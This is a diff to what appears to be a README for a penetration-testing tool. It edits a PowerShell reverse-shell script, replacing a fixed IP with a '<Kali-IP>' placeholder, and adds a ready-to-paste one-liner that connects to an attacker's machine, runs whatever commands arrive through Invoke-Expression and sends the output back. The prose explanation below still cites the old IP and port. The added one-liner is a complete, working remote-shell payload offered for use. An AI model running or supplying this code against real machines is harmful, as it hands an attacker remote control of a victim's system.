@@ -25,7 +25,7 @@ This tool is intended for ethical penetration testing, security research, or aut
 
 ### **PowerShell Reverse Shell Script:**
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient('10.10.1.6', 4444);
+$client = New-Object System.Net.Sockets.TCPClient('<Kali-IP>', port);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535 | % { 0 };
 while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
@@ -39,6 +39,10 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 $client.Close();
 ```
 
+### One Line 
+``` powershell
+$client = New-Object System.Net.Sockets.TCPClient('<Kali-IP>', port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535 | % { 0 };while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush();};$client.Close();
+```
 ### **Explanation:**
 1. **TCP Connection**: The reverse shell creates a TCP connection to the attacker's machine using the specified IP (`10.10.1.6`) and port (`4444`).
 2. **Data Stream**: Once connected, it listens for commands and executes them using `iex` (Invoke-Expression).
